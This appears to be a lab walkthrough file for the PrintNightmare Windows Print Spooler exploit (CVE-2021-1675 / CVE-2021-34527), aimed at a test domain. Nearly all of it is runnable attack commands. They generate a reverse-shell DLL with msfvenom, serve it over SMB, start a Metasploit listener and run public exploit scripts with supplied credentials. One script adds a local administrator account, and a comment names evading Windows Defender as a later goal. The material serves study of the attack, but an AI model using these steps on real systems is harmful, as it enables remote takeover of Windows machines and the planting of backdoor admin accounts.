# This is the PrintNightmare attack. 

############################################################################################################################################################################################################
# First Attack. CVE-2021-1675 / CVE-2021-34527. Attacking from Kali Linux. For the attack script, we used Cube's script. Link: https://github.com/cube0x0/CVE-2021-1675
############################################################################################################################################################################################################

# Step1. Generate malicious DLL.

# generate MALICIOUS DLL using msfvenom, that starts a reverse shell. saves reverseshell.dll
sudo msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=192.168.56.103 LPORT=4444 -o reverseshell.dll


# Step 2. Start an SMB server to host the malicious DLL.

# go to folder where the repo is cloned
cd ~/Desktop/PrintNightmare3

# Attack requires Cube's own Impacket version. Create a virtual environemnt (venv)  
# where you install his Impacket, such that you dont override the global Kali 
# impacket installation. 
# note: installation of Cube's impacket is not shown here 
python3 -m venv .venv

# activate venv for cube's impacket version
source .venv/bin/activate

# cd to where you installed his impacket version 
cd ~/Desktop/PrintNightmare3/impacket-local/examples

# start SMB Server with smb2support for newer server machines     
sudo python3 smbserver.py DLLSHARE -smb2support  ~/Desktop/PrintNightmare3


# Step 3. Start a Metasploit listener for the reverse shell.

# open msfconsole
sudo msfconsole

# select the multi/handler exploit (acts as our reverse shell listener)
use exploit/multi/handler

# type of payload to expect. windows reverse shell for us
set payload windows/x64/shell_reverse_tcp

# the ip address the target will call back to
set LHOST 192.168.56.103

# local port for the reverse shell
set LPORT 4444

# verify that everything is set
options

# launch the handler and wait for the incoming connection
exploit


# Step 4. Run the exploit.

# activate venv for cube's impacket version
source .venv/bin/activate

# Exploit start
    python3 CVE-2021-1675.py \
    offensive.local/franky.lanie:"Password123"@192.168.56.2 \
     '\\192.168.56.103\DLLSHARE\reverseshell.dll'


############################################################################################################################################################################################################
#  Second Attack. CVE-2021-34527. Attacking from the Windows Client. For the attack script, we used John Hammond's script. Link: https://github.com/JohnHammond/CVE-2021-34527
############################################################################################################################################################################################################


# ALTERNATIVE 1

# In PowerShell

# import the script
Import-Module .\cve-2021-34527.ps1

# run the script. Adds user `adm1n`/`P@ssw0rd` in the local admin group by default
Invoke-Nightmare 


# ALTERNATIVE 2

# By supplying the -DLL argument, we can use our own malicious DLL. We use the one previously created, which starts a reverse shell to our Kali machine. 
# The signature of Metasploit's malicious DLL seems to be instantly recognized by the Windows Defender. In a future iteration, creating a DLL with an unrecognized signature is desired.

# In PowerShell

# import the script
Import-Module .\cve-2021-34527.ps1

# run the script, but supply your own malicious DLL
Invoke-Nightmare -DLL "C:\temp\reverseshell.dll"
